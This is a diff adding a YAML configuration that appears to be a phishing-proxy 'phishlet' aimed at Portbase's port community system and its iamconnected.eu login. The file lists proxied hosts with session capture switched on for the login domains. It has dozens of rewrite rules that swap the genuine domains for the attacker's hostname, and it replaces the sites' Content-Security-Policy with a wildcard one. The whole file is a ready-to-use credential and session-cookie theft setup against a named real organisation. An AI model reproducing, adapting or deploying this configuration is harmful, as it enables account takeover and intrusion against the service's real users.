@@ -1,0 +1,335 @@
+#___________     .__.__    ___ ___                __              .___
+#\_   _____/__  _|__|  |  /   |   \  ____   ____ |  | __ ____   __| _/
+# |    __)_\  \/ /  |  | /    ~    \/  _ \ /  _ \|  |/ // __ \ / __ | 
+# |        \\   /|  |  |_\    Y    (  <_> |  <_> )    <\  ___// /_/ | 
+#/_______  / \_/ |__|____/\___|_  / \____/ \____/|__|_ \\___  >____ | 
+#        \/                     \/                    \/    \/     \/                                                            
+
+author: 'EvilHooked'
+min_ver: '4.3.0'
+
+login:
+  domain: 'www.portbase.com'
+  path: '/'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'portbase.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'portbase', orig_sub: 'portbase', domain: 'brain9storm.nl', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'cookiebot.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'gtm', orig_sub: 'www', domain: 'googletagmanager.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'consentcdn', orig_sub: 'consentcdn', domain: 'cookiebot.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'hbird', orig_sub: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf.cloud', domain: 'adobe.io', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mktoresp', orig_sub: '843-itw-312', domain: 'mktoresp.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'munchkin', orig_sub: 'munchkin', domain: 'marketo.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pcsl', orig_sub: 'login', domain: 'pcs.portbase.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pcs', orig_sub: 'pcs', domain: 'portbase.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pcsstart', orig_sub: 'start', domain: 'pcs.portbase.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'pcsw', orig_sub: 'www', domain: 'pcs.portbase.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'iamc-api', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'iamconnected.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'icwww', orig_sub: 'www', domain: 'iamconnected.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'iamconnected.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'autn', orig_sub: 'autn', domain: 'iamconnected.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'iamconnected.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'files', orig_sub: 'files', domain: 'iamconnected.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'beamer', orig_sub: 'app', domain: 'getbeamer.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'beamerapi', orig_sub: 'backend', domain: 'getbeamer.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'beamer_rt', orig_sub: 'realtime', domain: 'getbeamer.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'portbase-admin', orig_sub: 'portbase-admin', domain: 'okta-emea.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fiamc-api', orig_sub: 'fiamc-api', domain: 'ia.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'portbase.com', search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"', replace: "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob:; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';\"", mimes: ['text/html', 'application/xhtml+xml']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'portbase.com', search: 'https://www\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'portbase.com', search: 'www\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'portbase.com', search: '://www\.portbase\.com', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'portbase.com', search: '//www\.portbase\.com', replace: '//{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'portbase', domain: 'brain9storm.nl', search: 'https://portbase\.brain9storm\.nl', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'portbase', domain: 'brain9storm.nl', search: 'portbase\.brain9storm\.nl', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'consent', domain: 'cookiebot.com', search: 'https://consent\.cookiebot\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'consent', domain: 'cookiebot.com', search: 'consent\.cookiebot\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'consentcdn', domain: 'cookiebot.com', search: 'https://consentcdn\.cookiebot\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'consentcdn', domain: 'cookiebot.com', search: 'consentcdn\.cookiebot\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://www\.googletagmanager\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'www\.googletagmanager\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf.cloud', domain: 'adobe.io', search: 'https://project-hummingbird-hummingbird-websocket-nodejs-de-9194cf\.cloud\.adobe\.io', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf.cloud', domain: 'adobe.io', search: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf\.cloud\.adobe\.io', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: '843-itw-312', domain: 'mktoresp.com', search: 'https://843-itw-312\.mktoresp\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: '843-itw-312', domain: 'mktoresp.com', search: '843-itw-312\.mktoresp\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'munchkin', domain: 'marketo.net', search: 'https://munchkin\.marketo\.net', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'munchkin', domain: 'marketo.net', search: 'munchkin\.marketo\.net', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: 'https://login\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'pcs', domain: 'portbase.com', search: 'https://pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'start', domain: 'pcs.portbase.com', search: 'https://start\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'start', domain: 'pcs.portbase.com', search: 'start\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: 'login\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: '://login\.pcs\.portbase\.com', replace: '://{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: '//login\.pcs\.portbase\.com', replace: '//{hostname}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'https://www\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'www\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'https://iamc-internal-api\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'iamc-internal-api\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: 'https%3A%2F%2Flogin\.pcs\.portbase\.com', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'https%3A%2F%2Fwww\.pcs\.portbase\.com', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'https%3A%2F%2Fiamc-internal-api\.pcs\.portbase\.com', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # --- per-host self rewrite (CDN / third-party responses) ---
+  - {triggers_on: 'portbase.brain9storm.nl', orig_sub: 'portbase', domain: 'brain9storm.nl', search: 'https://portbase\.brain9storm\.nl', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'portbase.brain9storm.nl', orig_sub: 'portbase', domain: 'brain9storm.nl', search: 'portbase\.brain9storm\.nl', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'consent.cookiebot.com', orig_sub: 'consent', domain: 'cookiebot.com', search: 'https://consent\.cookiebot\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'consent.cookiebot.com', orig_sub: 'consent', domain: 'cookiebot.com', search: 'consent\.cookiebot\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'consentcdn.cookiebot.com', orig_sub: 'consentcdn', domain: 'cookiebot.com', search: 'https://consentcdn\.cookiebot\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'consentcdn.cookiebot.com', orig_sub: 'consentcdn', domain: 'cookiebot.com', search: 'consentcdn\.cookiebot\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://www\.googletagmanager\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'www\.googletagmanager\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf.cloud.adobe.io', orig_sub: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf.cloud', domain: 'adobe.io', search: 'https://project-hummingbird-hummingbird-websocket-nodejs-de-9194cf\.cloud\.adobe\.io', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf.cloud.adobe.io', orig_sub: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf.cloud', domain: 'adobe.io', search: 'project-hummingbird-hummingbird-websocket-nodejs-de-9194cf\.cloud\.adobe\.io', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: '843-itw-312.mktoresp.com', orig_sub: '843-itw-312', domain: 'mktoresp.com', search: 'https://843-itw-312\.mktoresp\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: '843-itw-312.mktoresp.com', orig_sub: '843-itw-312', domain: 'mktoresp.com', search: '843-itw-312\.mktoresp\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'munchkin.marketo.net', orig_sub: 'munchkin', domain: 'marketo.net', search: 'https://munchkin\.marketo\.net', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'munchkin.marketo.net', orig_sub: 'munchkin', domain: 'marketo.net', search: 'munchkin\.marketo\.net', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'pcs', domain: 'portbase.com', search: 'https://pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'pcs.portbase.com', orig_sub: 'pcs', domain: 'portbase.com', search: 'https://pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'start.pcs.portbase.com', orig_sub: 'start', domain: 'pcs.portbase.com', search: 'https://start\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'start.pcs.portbase.com', orig_sub: 'start', domain: 'pcs.portbase.com', search: 'start\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'start.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https://login\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'start.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'login\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'start.pcs.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'iamc-internal-api\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'pcs.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: 'https://login\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https://login\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'login\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: 'https://login\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: 'login\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https://login\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'login\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'https://iamc-internal-api\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'iamc-internal-api\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'https://www\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'www\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'login', domain: 'pcs.portbase.com', search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"', replace: "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob:; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';\"", mimes: ['text/html', 'application/xhtml+xml']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https%3A%2F%2Flogin\.iamconnected\.eu', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'https%3A%2F%2Fiamc-internal-api\.pcs\.portbase\.com', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.pcs.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'https%3A%2F%2Fwww\.pcs\.portbase\.com', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'iamc-internal-api.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https://login\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'iamc-internal-api.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'login\.iamconnected\.eu', replace: '{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'iamc-internal-api.pcs.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'www\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.pcs.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'https://www\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.pcs.portbase.com', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'www\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https://login\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'login\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.pcs.portbase.com', orig_sub: 'www', domain: 'iamconnected.eu', search: 'https://www\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.pcs.portbase.com', orig_sub: 'www', domain: 'iamconnected.eu', search: 'www\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'www.pcs.portbase.com', orig_sub: 'www', domain: 'iamconnected.eu', search: 'https%3A%2F%2Fwww\.iamconnected\.eu', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.pcs.portbase.com', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https%3A%2F%2Flogin\.iamconnected\.eu', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'iamc-internal-api.pcs.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'https://iamc-internal-api\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'iamc-internal-api.pcs.portbase.com', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'iamc-internal-api\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  # --- iamconnected (login flow) ---
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'login', domain: 'iamconnected.eu', search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"', replace: "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src * data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob:; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';\"", mimes: ['text/html', 'application/xhtml+xml']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'login', domain: 'iamconnected.eu', search: 'https://login\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'login', domain: 'iamconnected.eu', search: 'login\.iamconnected\.eu', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'https://iamc-internal-api\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'iamc-internal-api', domain: 'pcs.portbase.com', search: 'iamc-internal-api\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'https://www\.pcs\.portbase\.com', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'www', domain: 'pcs.portbase.com', search: 'www\.pcs\.portbase\.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'text/css', 'application/css']}
+  - {triggers_on: 'login.iamconnected.eu', orig_sub: 'www', domain: 'iamconnected.eu', search: 'https://www\.iamconnected\.eu', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/xhtml+xml', 'text/css', 'application/css']}
